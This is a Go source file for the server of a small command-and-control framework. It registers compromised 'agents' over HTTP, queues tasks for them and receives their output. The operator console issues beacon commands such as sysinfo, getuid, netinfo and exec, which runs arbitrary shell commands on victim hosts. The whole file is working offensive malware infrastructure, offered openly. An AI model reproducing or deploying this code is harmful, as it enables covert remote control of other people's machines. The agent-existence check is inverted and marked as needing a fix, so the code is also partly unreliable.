package main

import (
	"database/sql"
	"errors"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"

	dblib "github.com/RickConsole/minic2/database"
	_ "github.com/mattn/go-sqlite3"

	prompt "github.com/c-bata/go-prompt"
	"github.com/gookit/color"
	"github.com/thanhpk/randstr"
)

var (
	port         = flag.String("p", "8080", "Listen Port")
	tasklist     = make(map[string][]string)
	agentResults = make(map[string][]string)
	currentAgent string
	fail         = color.FgRed.Render("[*]")
	warn         = color.FgYellow.Render("[*]")
	succ         = color.FgGreen.Render("[*]")
	notif        = color.FgBlue.Render("[*]")
)

func main() {
	flag.Parse()
	if _, err := os.Stat("./agents.db"); err == nil {
		fmt.Println("Database Found!")
	} else if errors.Is(err, os.ErrNotExist) {
		//db does not exist
		fmt.Println("Creating Database...")
		file, err := os.Create("agents.db")
		if err != nil {
			log.Fatal(err.Error())
		}
		file.Close()
		fmt.Println("Database Created!")
		db, err := sql.Open("sqlite3", "./agents.db")
		checkErr(err)
		dblib.CreateAgentsTable(db)
		db.Close()
	}

	go func() {
		http.HandleFunc("/", defaultHandler)
		http.HandleFunc("/register", registerAgent)
		http.HandleFunc("/tasks", sendTasks)
		http.HandleFunc("/results", receiveOutput)
		fmt.Printf("\n"+succ+" Starting listening on port: %s\n", *port)
		log.Fatal(http.ListenAndServe(":"+*port, nil))
	}()

	startMainPrompt()

}

func defaultHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "Nothing to see here\n")
}

func registerAgent(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()

	fmt.Println("\n" + succ + " New Agent!: " + r.FormValue("username") + "@" + r.FormValue("hostname"))

	db, err := sql.Open("sqlite3", "./agents.db")
	checkErr(err)
	defer db.Close()
	id := randstr.String(6)
	dblib.InsertNewAgent(db, id, r.FormValue("hostname"), r.FormValue("username"))
	fmt.Fprint(w, id)

}

func receiveOutput(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	fmt.Println("\n"+succ+" Host Called Home: ", r.FormValue("id"), "\n\n", r.FormValue("output")+"\n")
}

func sendTasks(w http.ResponseWriter, r *http.Request) {
	//creating a string string map to queue up tasks
	r.ParseForm()

	agent := r.FormValue("id")
	if val, ok := tasklist[agent]; ok {
		cmdlist := strings.Join(val, " ")
		fmt.Fprintf(w, cmdlist)
		delete(tasklist, agent)
	} else {
		return
	}
}

func startMainPrompt() {
	p := prompt.New(mainExecutor, NoopCompleter, prompt.OptionPrefix(">>> "))
	p.Run()
}

func startAgentPrompt(agentid string) {
	db, err := sql.Open("sqlite3", "./agents.db")
	checkErr(err)
	exists := dblib.CheckAgent(db, agentid) //this needs fixing
	if exists {
		fmt.Println(fail + " Agent does not exist!")
	} else {
		fmt.Println(notif+"Interacting with:", agentid)
		currentAgent = agentid
		p := prompt.New(agentExecutor, NoopCompleter, prompt.OptionPrefix("["+agentid+"]"+">>> "))
		p.Run()
	}

}

func mainExecutor(c string) {
	c = strings.TrimSpace(c)
	if c == "" {
		return
	} else if c == "quit" || c == "exit" {
		fmt.Println("Quitting...")
		os.Exit(0)
	} else if c == "agents" {
		db, err := sql.Open("sqlite3", "./agents.db")
		checkErr(err)
		dblib.ShowAgents(db)
		db.Close()
	} else if c == "remove" {
		fmt.Println("Usage: remove <agent id>")
	} else if strings.Fields(c)[0] == "remove" && len(strings.Fields(c)) == 2 {
		db, err := sql.Open("sqlite3", "./agents.db")
		checkErr(err)
		dblib.DeleteAgent(db, strings.Fields(c)[1])
		db.Close()
	} else if c == "interact" {
		fmt.Println("Usage: interact <agent id>")
	} else if strings.Fields(c)[0] == "interact" && len(strings.Fields(c)) == 2 {
		startAgentPrompt(strings.Fields(c)[1])
	} else {
		cmd := exec.Command("/bin/sh", "-c", c)
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			fmt.Printf("Error: %s\n", err.Error())
		}
	}
}

func agentExecutor(c string) {
	c = strings.TrimSpace(c)
	if c == "" {
		return
	}
	if c == "back" || c == "background" || c == "exit" {
		defer startMainPrompt()
		return
	} else if c == "sysinfo" {
		fmt.Println("[*] Tasked beacon with: " + c)
		tasklist[currentAgent] = append(tasklist[currentAgent], c)
	} else if strings.Fields(c)[0] == "sleep" { // sleep command
		if len(strings.Fields(c)) != 2 {
			fmt.Println("Usage: sleep <time in seconds>")
		}
		fmt.Println(notif + " Tasked beacon with: " + c)
		tasklist[currentAgent] = append(tasklist[currentAgent], c)
	} else if strings.Fields(c)[0] == "getuid" { // getuid command
		fmt.Println(notif + " Tasked beacon with: " + c)
		tasklist[currentAgent] = append(tasklist[currentAgent], c)
		return
	} else if strings.Fields(c)[0] == "netinfo" {
		fmt.Println(notif + "Tasked beacon with: " + strings.Fields(c)[0])
		tasklist[currentAgent] = append(tasklist[currentAgent], c)
		return
	} else if strings.Fields(c)[0] == "exec" { // exec command
		if len(strings.Fields(c)) == 1 {
			fmt.Println("Usage: exec <shell command to run>")
		}
		fmt.Println(notif + " Tasked beacon with: " + c)
		tasklist[currentAgent] = append(tasklist[currentAgent], c)
		return

	} else {
		fmt.Println("Unknown Command")
	}
}

func NoopCompleter(d prompt.Document) []prompt.Suggest {
	return nil
}

/*
func agentCompleter(d prompt.Document) []prompt.Suggest {

	s := []prompt.Suggest{
		{Text: "getuid", Description: "Gets User ID information"},
		{Text: "sysinfo", Description: "Gets System Info"},
		{Text: "exec", Description: "Runs a shell command on the target"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}
*/

func checkErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
